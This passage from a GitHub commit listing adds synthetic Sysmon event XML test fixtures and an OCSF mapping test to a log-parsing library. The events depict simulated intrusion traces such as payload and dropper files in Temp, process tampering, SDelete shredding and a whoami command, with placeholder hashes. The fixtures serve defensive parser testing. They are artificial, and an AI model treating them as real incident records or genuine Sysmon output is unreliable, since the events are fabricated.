UserID=\"S-1-5-18\"/>\n+  </System>\n+  <EventData>\n+    <Data Name=\"RuleName\">-</Data>\n+    <Data Name=\"UtcTime\">2025-03-22 10:30:00.000</Data>\n+    <Data Name=\"ProcessGuid\">{A23EAE89-BD56-67E0-0000-0010E9D95E03}</Data>\n+    <Data Name=\"ProcessId\">4812</Data>\n+    <Data Name=\"Image\">C:\\Users\\jdoe\\AppData\\Local\\Temp\\payload.exe</Data>\n+    <Data Name=\"Session\">1</Data>\n+    <Data Name=\"ClientInfo\">WORKSTATION01\\jdoe</Data>\n+    <Data Name=\"Hashes\">SHA256=1A2B3C4D5E6F7A8B9C0D1E2F3A4B5C6D7E8F9A0B1C2D3E4F5A6B7C8D9E0F1A2B</Data>\n+    <Data Name=\"Archived\">true</Data>\n+    <Data Name=\"User\">CORP\\jdoe</Data>\n+  </EventData>\n+</Event>"
    },
    {
      "sha": "2b20db8389b8f331cdd063b2c75814cbc89bf7ca",
      "filename": "sysmon/tests/inputs/25-ProcessTampering.xml",
      "status": "added",
      "additions": 31,
      "deletions": 0,
      "changes": 31,
      "blob_url": "https://github.com/tenzir/library/blob/2a95f0825ffa5bcf0f716d16f60c6b05a64fd317/sysmon%2Ftests%2Finputs%2F25-ProcessTampering.xml",
      "raw_url": "https://github.com/tenzir/library/raw/2a95f0825ffa5bcf0f716d16f60c6b05a64fd317/sysmon%2Ftests%2Finputs%2F25-ProcessTampering.xml",
      "contents_url": "https://api.github.com/repos/tenzir/library/contents/sysmon%2Ftests%2Finputs%2F25-ProcessTampering.xml?ref=2a95f0825ffa5bcf0f716d16f60c6b05a64fd317",
      "patch": "@@ -0,0 +1,31 @@\n+<!-- Sysmon EID 25 \u2013 ProcessTampering (Schema 4.90) -->\n+<!-- Detects process-hiding techniques such as process hollowing (\"hollow\") and -->\n+<!-- process herpaderping (\"herpaderp\"), where a process image is replaced after mapping. -->\n+<!-- Type field values: \"Image is replaced\", \"Image is locked for access\" -->\n+<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\n+  <System>\n+    <Provider Name=\"Microsoft-Windows-Sysmon\" Guid=\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\"/>\n+    <EventID>25</EventID>\n+    <Version>5</Version>\n+    <Level>4</Level>\n+    <Task>25</Task>\n+    <Opcode>0</Opcode>\n+    <Keywords>0x8000000000000000</Keywords>\n+    <TimeCreated SystemTime=\"2025-03-22T10:31:00.000000000Z\"/>\n+    <EventRecordID>1025</EventRecordID>\n+    <Correlation/>\n+    <Execution ProcessID=\"3216\" ThreadID=\"3964\"/>\n+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>\n+    <Computer>WORKSTATION01.corp.local</Computer>\n+    <Security UserID=\"S-1-5-18\"/>\n+  </System>\n+  <EventData>\n+    <Data Name=\"RuleName\">-</Data>\n+    <Data Name=\"UtcTime\">2025-03-22 10:31:00.000</Data>\n+    <Data Name=\"ProcessGuid\">{A23EAE89-BD56-67E0-0000-0010E9D95E06}</Data>\n+    <Data Name=\"ProcessId\">7744</Data>\n+    <Data Name=\"Image\">C:\\Windows\\System32\\svchost.exe</Data>\n+    <Data Name=\"Type\">Image is replaced</Data>\n+    <Data Name=\"User\">CORP\\jdoe</Data>\n+  </EventData>\n+</Event>"
    },
    {
      "sha": "d9ff392b96aeab0f357e2b4d2ea3764596ac14ec",
      "filename": "sysmon/tests/inputs/255-Error.xml",
      "status": "added",
      "additions": 27,
      "deletions": 0,
      "changes": 27,
      "blob_url": "https://github.com/tenzir/library/blob/2a95f0825ffa5bcf0f716d16f60c6b05a64fd317/sysmon%2Ftests%2Finputs%2F255-Error.xml",
      "raw_url": "https://github.com/tenzir/library/raw/2a95f0825ffa5bcf0f716d16f60c6b05a64fd317/sysmon%2Ftests%2Finputs%2F255-Error.xml",
      "contents_url": "https://api.github.com/repos/tenzir/library/contents/sysmon%2Ftests%2Finputs%2F255-Error.xml?ref=2a95f0825ffa5bcf0f716d16f60c6b05a64fd317",
      "patch": "@@ -0,0 +1,27 @@\n+<!-- Sysmon EID 255 \u2013 Error (Schema 4.90) -->\n+<!-- Generated when Sysmon encounters an internal error. -->\n+<!-- ID field contains the internal error code; Description explains the issue. -->\n+<!-- Check for these if events seem to be missing \u2014 could indicate a config or resource issue. -->\n+<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\n+  <System>\n+    <Provider Name=\"Microsoft-Windows-Sysmon\" Guid=\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\"/>\n+    <EventID>255</EventID>\n+    <Version>3</Version>\n+    <Level>2</Level>\n+    <Task>255</Task>\n+    <Opcode>0</Opcode>\n+    <Keywords>0x8000000000000000</Keywords>\n+    <TimeCreated SystemTime=\"2025-03-22T10:36:00.000000000Z\"/>\n+    <EventRecordID>1255</EventRecordID>\n+    <Correlation/>\n+    <Execution ProcessID=\"3216\" ThreadID=\"3964\"/>\n+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>\n+    <Computer>WORKSTATION01.corp.local</Computer>\n+    <Security UserID=\"S-1-5-18\"/>\n+  </System>\n+  <EventData>\n+    <Data Name=\"UtcTime\">2025-03-22 10:36:00.000</Data>\n+    <Data Name=\"ID\">3</Data>\n+    <Data Name=\"Description\">Failed to access process: Access is denied. (PID: 4, Image: System)</Data>\n+  </EventData>\n+</Event>"
    },
    {
      "sha": "33757e70a0007ff748a5581de273a24bf26afbac",
      "filename": "sysmon/tests/inputs/26-FileDeleteDetected.xml",
      "status": "added",
      "additions": 32,
      "deletions": 0,
      "changes": 32,
      "blob_url": "https://github.com/tenzir/library/blob/2a95f0825ffa5bcf0f716d16f60c6b05a64fd317/sysmon%2Ftests%2Finputs%2F26-FileDeleteDetected.xml",
      "raw_url": "https://github.com/tenzir/library/raw/2a95f0825ffa5bcf0f716d16f60c6b05a64fd317/sysmon%2Ftests%2Finputs%2F26-FileDeleteDetected.xml",
      "contents_url": "https://api.github.com/repos/tenzir/library/contents/sysmon%2Ftests%2Finputs%2F26-FileDeleteDetected.xml?ref=2a95f0825ffa5bcf0f716d16f60c6b05a64fd317",
      "patch": "@@ -0,0 +1,32 @@\n+<!-- Sysmon EID 26 \u2013 FileDeleteDetected (Schema 4.90) -->\n+<!-- Like EID 23 but does NOT archive the deleted file. Detection-only. -->\n+<!-- Lower storage overhead than EID 23 when archiving isn't needed. -->\n+<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\n+  <System>\n+    <Provider Name=\"Microsoft-Windows-Sysmon\" Guid=\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\"/>\n+    <EventID>26</EventID>\n+    <Version>5</Version>\n+    <Level>4</Level>\n+    <Task>26</Task>\n+    <Opcode>0</Opcode>\n+    <Keywords>0x8000000000000000</Keywords>\n+    <TimeCreated SystemTime=\"2025-03-22T10:32:00.000000000Z\"/>\n+    <EventRecordID>1026</EventRecordID>\n+    <Correlation/>\n+    <Execution ProcessID=\"3216\" ThreadID=\"3964\"/>\n+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>\n+    <Computer>WORKSTATION01.corp.local</Computer>\n+    <Security UserID=\"S-1-5-18\"/>\n+  </System>\n+  <EventData>\n+    <Data Name=\"RuleName\">-</Data>\n+    <Data Name=\"UtcTime\">2025-03-22 10:32:00.000</Data>\n+    <Data Name=\"ProcessGuid\">{A23EAE89-BD56-67E0-0000-0010E9D95E03}</Data>\n+    <Data Name=\"ProcessId\">4812</Data>\n+    <Data Name=\"User\">CORP\\jdoe</Data>\n+    <Data Name=\"Image\">C:\\Users\\jdoe\\AppData\\Local\\Temp\\payload.exe</Data>\n+    <Data Name=\"TargetFilename\">C:\\Users\\jdoe\\AppData\\Local\\Temp\\stage2_loader.dll</Data>\n+    <Data Name=\"Hashes\">SHA1=BBCC2233...,MD5=DDEE4455...,SHA256=FF006677...,IMPHASH=88991122...</Data>\n+    <Data Name=\"IsExecutable\">true</Data>\n+  </EventData>\n+</Event>"
    },
    {
      "sha": "e88d7f2e38b1e19fd6ab23856eb92555cbbee641",
      "filename": "sysmon/tests/inputs/27-FileBlockExecutable.xml",
      "status": "added",
      "additions": 31,
      "deletions": 0,
      "changes": 31,
      "blob_url": "https://github.com/tenzir/library/blob/2a95f0825ffa5bcf0f716d16f60c6b05a64fd317/sysmon%2Ftests%2Finputs%2F27-FileBlockExecutable.xml",
      "raw_url": "https://github.com/tenzir/library/raw/2a95f0825ffa5bcf0f716d16f60c6b05a64fd317/sysmon%2Ftests%2Finputs%2F27-FileBlockExecutable.xml",
      "contents_url": "https://api.github.com/repos/tenzir/library/contents/sysmon%2Ftests%2Finputs%2F27-FileBlockExecutable.xml?ref=2a95f0825ffa5bcf0f716d16f60c6b05a64fd317",
      "patch": "@@ -0,0 +1,31 @@\n+<!-- Sysmon EID 27 \u2013 FileBlockExecutable (Schema 4.90) -->\n+<!-- Fires AND blocks creation of an executable file (PE format) matching a rule. -->\n+<!-- This is an active blocking event, not just telemetry \u2014 Sysmon prevents the write. -->\n+<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\n+  <System>\n+    <Provider Name=\"Microsoft-Windows-Sysmon\" Guid=\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\"/>\n+    <EventID>27</EventID>\n+    <Version>5</Version>\n+    <Level>4</Level>\n+    <Task>27</Task>\n+    <Opcode>0</Opcode>\n+    <Keywords>0x8000000000000000</Keywords>\n+    <TimeCreated SystemTime=\"2025-03-22T10:33:00.000000000Z\"/>\n+    <EventRecordID>1027</EventRecordID>\n+    <Correlation/>\n+    <Execution ProcessID=\"3216\" ThreadID=\"3964\"/>\n+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>\n+    <Computer>WORKSTATION01.corp.local</Computer>\n+    <Security UserID=\"S-1-5-18\"/>\n+  </System>\n+  <EventData>\n+    <Data Name=\"RuleName\">block-exec-in-temp</Data>\n+    <Data Name=\"UtcTime\">2025-03-22 10:33:00.000</Data>\n+    <Data Name=\"ProcessGuid\">{A23EAE89-BD56-67E0-0000-0010E9D95E07}</Data>\n+    <Data Name=\"ProcessId\">5500</Data>\n+    <Data Name=\"User\">CORP\\jdoe</Data>\n+    <Data Name=\"Image\">C:\\Program Files\\Mozilla Firefox\\firefox.exe</Data>\n+    <Data Name=\"TargetFilename\">C:\\Users\\jdoe\\AppData\\Local\\Temp\\update.exe</Data>\n+    <Data Name=\"Hashes\">SHA1=CC001122...,MD5=DD334455...,SHA256=EE667788...,IMPHASH=FF990011...</Data>\n+  </EventData>\n+</Event>"
    },
    {
      "sha": "a95672e6776e6b2583b61c932093ff50e7de5a36",
      "filename": "sysmon/tests/inputs/28-FileBlockShredding.xml",
      "status": "added",
      "additions": 32,
      "deletions": 0,
      "changes": 32,
      "blob_url": "https://github.com/tenzir/library/blob/2a95f0825ffa5bcf0f716d16f60c6b05a64fd317/sysmon%2Ftests%2Finputs%2F28-FileBlockShredding.xml",
      "raw_url": "https://github.com/tenzir/library/raw/2a95f0825ffa5bcf0f716d16f60c6b05a64fd317/sysmon%2Ftests%2Finputs%2F28-FileBlockShredding.xml",
      "contents_url": "https://api.github.com/repos/tenzir/library/contents/sysmon%2Ftests%2Finputs%2F28-FileBlockShredding.xml?ref=2a95f0825ffa5bcf0f716d16f60c6b05a64fd317",
      "patch": "@@ -0,0 +1,32 @@\n+<!-- Sysmon EID 28 \u2013 FileBlockShredding (Schema 4.90) -->\n+<!-- Fires AND blocks file-shredding/secure-delete tools (e.g., SDelete, cipher /w). -->\n+<!-- Prevents attackers from overwriting files to hinder forensic recovery. -->\n+<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\n+  <System>\n+    <Provider Name=\"Microsoft-Windows-Sysmon\" Guid=\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\"/>\n+    <EventID>28</EventID>\n+    <Version>5</Version>\n+    <Level>4</Level>\n+    <Task>28</Task>\n+    <Opcode>0</Opcode>\n+    <Keywords>0x8000000000000000</Keywords>\n+    <TimeCreated SystemTime=\"2025-03-22T10:34:00.000000000Z\"/>\n+    <EventRecordID>1028</EventRecordID>\n+    <Correlation/>\n+    <Execution ProcessID=\"3216\" ThreadID=\"3964\"/>\n+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>\n+    <Computer>WORKSTATION01.corp.local</Computer>\n+    <Security UserID=\"S-1-5-18\"/>\n+  </System>\n+  <EventData>\n+    <Data Name=\"RuleName\">-</Data>\n+    <Data Name=\"UtcTime\">2025-03-22 10:34:00.000</Data>\n+    <Data Name=\"ProcessGuid\">{A23EAE89-BD56-67E0-0000-0010E9D95E08}</Data>\n+    <Data Name=\"ProcessId\">8832</Data>\n+    <Data Name=\"User\">CORP\\jdoe</Data>\n+    <Data Name=\"Image\">C:\\Tools\\SDelete64.exe</Data>\n+    <Data Name=\"TargetFilename\">C:\\Users\\jdoe\\AppData\\Local\\Temp\\payload.exe</Data>\n+    <Data Name=\"Hashes\">SHA1=11223344...,MD5=55667788...,SHA256=99AABBCC...,IMPHASH=DDEEFF00...</Data>\n+    <Data Name=\"IsExecutable\">true</Data>\n+  </EventData>\n+</Event>"
    },
    {
      "sha": "d1ba89bc20920cee082e7248bdf361bc303e6464",
      "filename": "sysmon/tests/inputs/29-FileExecutableDetected.xml",
      "status": "added",
      "additions": 32,
      "deletions": 0,
      "changes": 32,
      "blob_url": "https://github.com/tenzir/library/blob/2a95f0825ffa5bcf0f716d16f60c6b05a64fd317/sysmon%2Ftests%2Finputs%2F29-FileExecutableDetected.xml",
      "raw_url": "https://github.com/tenzir/library/raw/2a95f0825ffa5bcf0f716d16f60c6b05a64fd317/sysmon%2Ftests%2Finputs%2F29-FileExecutableDetected.xml",
      "contents_url": "https://api.github.com/repos/tenzir/library/contents/sysmon%2Ftests%2Finputs%2F29-FileExecutableDetected.xml?ref=2a95f0825ffa5bcf0f716d16f60c6b05a64fd317",
      "patch": "@@ -0,0 +1,32 @@\n+<!-- Sysmon EID 29 \u2013 FileExecutableDetected (Schema 4.90) -->\n+<!-- Added in Sysmon v15 (October 2023). Fires when a new PE (executable) file is detected -->\n+<!-- being written to disk. Complements EID 11 (FileCreate) but is PE-specific. -->\n+<!-- Unlike EID 27, this is detection-only \u2014 it does NOT block the write. -->\n+<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\n+  <System>\n+    <Provider Name=\"Microsoft-Windows-Sysmon\" Guid=\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\"/>\n+    <EventID>29</EventID>\n+    <Version>5</Version>\n+    <Level>4</Level>\n+    <Task>29</Task>\n+    <Opcode>0</Opcode>\n+    <Keywords>0x8000000000000000</Keywords>\n+    <TimeCreated SystemTime=\"2025-03-22T10:35:00.000000000Z\"/>\n+    <EventRecordID>1029</EventRecordID>\n+    <Correlation/>\n+    <Execution ProcessID=\"3216\" ThreadID=\"3964\"/>\n+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>\n+    <Computer>WORKSTATION01.corp.local</Computer>\n+    <Security UserID=\"S-1-5-18\"/>\n+  </System>\n+  <EventData>\n+    <Data Name=\"RuleName\">-</Data>\n+    <Data Name=\"UtcTime\">2025-03-22 10:35:00.000</Data>\n+    <Data Name=\"ProcessGuid\">{A23EAE89-BD56-67E0-0000-0010E9D95E07}</Data>\n+    <Data Name=\"ProcessId\">5500</Data>\n+    <Data Name=\"User\">CORP\\jdoe</Data>\n+    <Data Name=\"Image\">C:\\Program Files\\Mozilla Firefox\\firefox.exe</Data>\n+    <Data Name=\"TargetFilename\">C:\\Users\\jdoe\\AppData\\Local\\Temp\\malware_dropper.exe</Data>\n+    <Data Name=\"Hashes\">SHA1=FFEE1234...,MD5=DDCC5678...,SHA256=BBAA9ABC...,IMPHASH=99884567...</Data>\n+  </EventData>\n+</Event>"
    },
    {
      "sha": "480ec7508c5cf4a800b043e4137b8aa5470a8c25",
      "filename": "sysmon/tests/ocsf/01-ProcessCreate.tql",
      "status": "added",
      "additions": 10,
      "deletions": 0,
      "changes": 10,
      "blob_url": "https://github.com/tenzir/library/blob/2a95f0825ffa5bcf0f716d16f60c6b05a64fd317/sysmon%2Ftests%2Focsf%2F01-ProcessCreate.tql",
      "raw_url": "https://github.com/tenzir/library/raw/2a95f0825ffa5bcf0f716d16f60c6b05a64fd317/sysmon%2Ftests%2Focsf%2F01-ProcessCreate.tql",
      "contents_url": "https://api.github.com/repos/tenzir/library/contents/sysmon%2Ftests%2Focsf%2F01-ProcessCreate.tql?ref=2a95f0825ffa5bcf0f716d16f60c6b05a64fd317",
      "patch": "@@ -0,0 +1,10 @@\n+from_file f\"{env(\"TENZIR_INPUTS\")}/01-ProcessCreate.xml\" {\n+  read_all\n+}\n+sysmon::ocsf::map data\n+this = ocsf\n+ocsf::derive\n+ocsf::cast\n+\n+// Ensure determinstic tests.\n+drop metadata.processed_time"
    },
    {
      "sha": "3216d0c323977d750a3fa25613fc0387e524c70e",
      "filename": "sysmon/tests/ocsf/01-ProcessCreate.txt",
      "status": "added",
      "additions": 148,
      "deletions": 0,
      "changes": 148,
      "blob_url": "https://github.com/tenzir/library/blob/2a95f0825ffa5bcf0f716d16f60c6b05a64fd317/sysmon%2Ftests%2Focsf%2F01-ProcessCreate.txt",
      "raw_url": "https://github.com/tenzir/library/raw/2a95f0825ffa5bcf0f716d16f60c6b05a64fd317/sysmon%2Ftests%2Focsf%2F01-ProcessCreate.txt",
      "contents_url": "https://api.github.com/repos/tenzir/library/contents/sysmon%2Ftests%2Focsf%2F01-ProcessCreate.txt?ref=2a95f0825ffa5bcf0f716d16f60c6b05a64fd317",
      "patch": "@@ -0,0 +1,148 @@\n+{\n+  activity_id: 1,\n+  activity_name: \"Launch\",\n+  actor: {\n+    process: {\n+      cmd_line: \"C:\\\\Windows\\\\Explorer.EXE\",\n+      file: {\n+        name: \"explorer.exe\",\n+        path: \"C:\\\\Windows\\\\explorer.exe\",\n+        type: \"Executable File\",\n+        type_id: 8,\n+      },\n+      name: \"explorer.exe\",\n+      path: \"C:\\\\Windows\\\\explorer.exe\",\n+      pid: 7620,\n+      uid: \"{A23EAE89-BD28-67E0-0000-00102F345D01}\",\n+      user: {\n+        domain: \"CORP\",\n+        name: \"jdoe\",\n+      },\n+    },\n+    session: {\n+      uid: \"{A23EAE89-B357-67E0-0000-002005EB0701}\",\n+      uid_alt: \"0x7eb05\",\n+    },\n+    user: {\n+      domain: \"CORP\",\n+      name: \"jdoe\",\n+    },\n+  },\n+  category_name: \"System Activity\",\n+  category_uid: 1,\n+  class_name: \"Process Activity\",\n+  class_uid: 1007,\n+  device: {\n+    hostname: \"WORKSTATION01.corp.local\",\n+  },\n+  launch_type: \"Spawn\",\n+  launch_type_id: 1,\n+  metadata: {\n+    event_code: \"1\",\n+    extensions: [\n+      {\n+        name: \"win\",\n+      },\n+    ],\n+    log_format: \"xml\",\n+    log_level: \"4\",\n+    log_name: \"Microsoft-Windows-Sysmon/Operational\",\n+    log_version: \"5\",\n+    logged_time: 2025-03-22T10:14:03.512345600Z,\n+    original_event_uid: \"1001\",\n+    product: {\n+      name: \"Microsoft-Windows-Sysmon\",\n+      uid: \"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\",\n+      vendor_name: \"Microsoft\",\n+    },\n+    profiles: [\n+      \"host\",\n+    ],\n+    version: \"1.7.0\",\n+  },\n+  process: {\n+    cmd_line: \"cmd.exe /c whoami\",\n+    created_time: 2025-03-22T10:14:03.512Z,\n+    file: {\n+      company_name: \"Microsoft Corporation\",\n+      desc: \"Windows Command Processor\",\n+      hashes: [\n+        {\n+          algorithm: \"SHA-1\",\n+          algorithm_id: 2,\n+          value: \"AEC94D28...\",\n+        },\n+        {\n+          algorithm: \"MD5\",\n+          algorithm_id: 1,\n+          value: \"A6C4A1DA...\",\n+        },\n+        {\n+          algorithm: \"SHA-256\",\n+          algorithm_id: 3,\n+          value: \"F23EBF52...\",\n+        },\n+        {\n+          algorithm: \"Other\",\n+          algorithm_id: 99,\n+          value: \"2E93BF38...\",\n+        },\n+      ],\n+      internal_name: \"Cmd.Exe\",\n+      name: \"cmd.exe\",\n+      path: \"C:\\\\Windows\\\\System32\\\\cmd.exe\",\n+      product: {\n+        name: \"Microsoft\u00ae Windows\u00ae Operating System\",\n+      },\n+      type: \"Executable File\",\n+      type_id: 8,\n+      version: \"10.0.22621.1 (WinBuild.160101.0800)\",\n+    },\n+    integrity: \"Medium\",\n+    integrity_id: 3,\n+    name: \"cmd.exe\",\n+    parent_process: {\n+      cmd_line: \"C:\\\\Windows\\\\Explorer.EXE\",\n+      file: {\n+        name: \"explorer.exe\",\n+        path: \"C:\\\\Windows\\\\explorer.exe\",\n+        type: \"Executable File\",\n+        type_id: 8,\n+      },\n+      path: \"C:\\\\Windows\\\\explorer.exe\",\n+      pid: 7620,\n+      uid: \"{A23EAE89-BD28-67E0-0000-00102F345D01}\",\n+      user: {\n+        domain: \"CORP\",\n+        name: \"jdoe\",\n+      },\n+    },\n+    path: \"C:\\\\Windows\\\\System32\\\\cmd.exe\",\n+    pid: 4812,\n+    uid: \"{A23EAE89-BD56-67E0-0000-0010E9D95E01}\",\n+    user: {\n+      domain: \"CORP\",\n+      name: \"jdoe\",\n+    },\n+    working_directory: \"C:\\\\Users\\\\jdoe\\\\\",\n+  },\n+  raw_data: \"<!-- Sysmon EID 1 \u2013 ProcessCreate (Schema 4.90) -->\\n<Event xmlns=\\\"http://schemas.microsoft.com/win/2004/08/events/event\\\">\\n  <System>\\n    <Provider Name=\\\"Microsoft-Windows-Sysmon\\\" Guid=\\\"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\\\"/>\\n    <EventID>1</EventID>\\n    <Version>5</Version>\\n    <Level>4</Level>\\n    <Task>1</Task>\\n    <Opcode>0</Opcode>\\n    <Keywords>0x8000000000000000</Keywords>\\n    <TimeCreated SystemTime=\\\"2025-03-22T10:14:03.512345600Z\\\"/>\\n    <EventRecordID>1001</EventRecordID>\\n    <Correlation/>\\n    <Execution ProcessID=\\\"3216\\\" ThreadID=\\\"3964\\\"/>\\n    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>\\n    <Computer>WORKSTATION01.corp.local</Computer>\\n    <Security UserID=\\\"S-1-5-18\\\"/>\\n  </System>\\n  <EventData>\\n    <Data Name=\\\"RuleName\\\">-</Data>\\n    <Data Name=\\\"UtcTime\\\">2025-03-22 10:14:03.512</Data>\\n    <Data Name=\\\"ProcessGuid\\\">{A23EAE89-BD56-67E0-0000-0010E9D95E01}</Data>\\n    <Data Name=\\\"ProcessId\\\">4812</Data>\\n    <Data Name=\\\"Image\\\">C:\\\\Windows\\\\System32\\\\cmd.exe</Data>\\n    <Data Name=\\\"FileVersion\\\">10.0.22621.1 (WinBuild.160101.0800)</Data>\\n    <Data Name=\\\"Description\\\">Windows Command Processor</Data>\\n    <Data Name=\\\"Product\\\">Microsoft\u00ae Windows\u00ae Operating System</Data>\\n    <Data Name=\\\"Company\\\">Microsoft Corporation</Data>\\n    <Data Name=\\\"OriginalFileName\\\">Cmd.Exe</Data>\\n    <Data Name=\\\"CommandLine\\\">cmd.exe /c whoami</Data>\\n    <Data Name=\\\"CurrentDirectory\\\">C:\\\\Users\\\\jdoe\\\\</Data>\\n    <Data Name=\\\"User\\\">CORP\\\\jdoe</Data>\\n    <Data Name=\\\"LogonGuid\\\">{A23EAE89-B357-67E0-0000-002005EB0701}</Data>\\n    <Data Name=\\\"LogonId\\\">0x7eb05</Data>\\n    <Data Name=\\\"TerminalSessionId\\\">1</Data>\\n    <Data Name=\\\"IntegrityLevel\\\">Medium</Data>\\n    <Data Name=\\\"Hashes\\\">SHA1=AEC94D28...,MD5=A6C4A1DA...,SHA256=F23EBF52...,IMPHASH=2E93BF38...</Data>\\n    <Data Name=\\\"ParentProcessGuid\\\">{A23EAE89-BD28-67E0-0000-00102F345D01}</Data>\\n    <Data Name=\\\"ParentProcessId\\\">7620</Data>\\n    <Data Name=\\\"ParentImage\\\">C:\\\\Windows\\\\explorer.exe</Data>\\n    <Data Name=\\\"ParentCommandLine\\\">C:\\\\Windows\\\\Explorer.EXE</Data>\\n    <Data Name=\\\"ParentUser\\\">CORP\\\\jdoe</Data>\\n  </EventData>\\n</Event>\\n\",\n+  raw_data_size: 2075,\n+  severity: \"Informational\",\n+  severity_id: 1,\n+  status: \"Success\",\n+  status_id: 1,\n+  time: 2025-03-22T10:14:03.512Z,\n+  type_name: \"Process Activity: Launch\",\n+  type_uid: 100701,\n+  unmapped: {\n+    System: {\n+      Task: 1,\n+      Opcode: 0,\n+      Keywords: \"0x8000000000000000\",\n+    },\n+    EventData: {\n+      TerminalSessionId: 1,\n+    },\n+  },\n+}"
    },
